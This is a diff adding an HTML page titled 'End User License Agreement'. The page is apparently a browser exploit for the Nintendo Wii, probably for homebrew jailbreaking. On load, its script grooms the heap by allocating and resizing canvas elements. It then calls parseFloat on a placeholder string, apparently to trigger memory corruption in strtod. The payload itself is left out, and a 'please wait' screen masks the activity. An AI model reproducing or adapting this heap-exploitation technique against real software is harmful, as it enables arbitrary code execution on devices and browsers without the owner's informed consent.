@@ -1,0 +1,53 @@
+<html>
+	<head>
+		<title>End User License Agreement</title>
+		<script>
+			function go(){
+				var small_bigint_size = 0x20 / 4;
+				var big_bigint_size = 0x40018 / 4
+				var number = 0xa00;
+				var heap_helper = [];
+				
+				for (var i = 0; i <= number; i++) {
+					var a = document.createElement("canvas");
+					a.height = 1;
+					a.width = 1;
+					heap_helper[i] = a;
+				}
+				
+				for (var i = 0; i < number; i++) {
+					heap_helper[i].width = small_bigint_size; // Allocate a bunch of small bigints so that we use up the misc space in the heap.
+				}
+				
+				heap_helper[number].width = big_bigint_size;
+				
+				// minus 3 here to prevent blocks being combined
+				for (var i = number - 3; i >= number - 7; i-=2) {
+					heap_helper[i].width = small_bigint_size + 20; // Resize every other canvas starting from the back to punch holes in the heap for us.
+				}
+				
+				heap_helper[number].width = big_bigint_size + 20; // Free up big block at the end so it can be reused in strtod
+				
+				parseFloat("0.\
+				INSERT_HERE\
+				");
+			}
+			
+			function prep(){
+				var a = document.createElement("img");
+				a.onload = go;
+				a.style = "display:none";
+				document.body.appendChild(a);
+				a.src = "payload.png";
+			}
+		</script>
+	</head>
+	<body onload="prep()" style="background: #9EDBF9">
+		<br>
+		<center><img src="rd.png" width="100"></center>
+		<br>
+		<center>Please wait, this will take 1-2 minutes.</center>
+		<br>
+		<center>If your Wii remote stops responding please power off your Wii and try again.</center>
+	</body>
+</html>
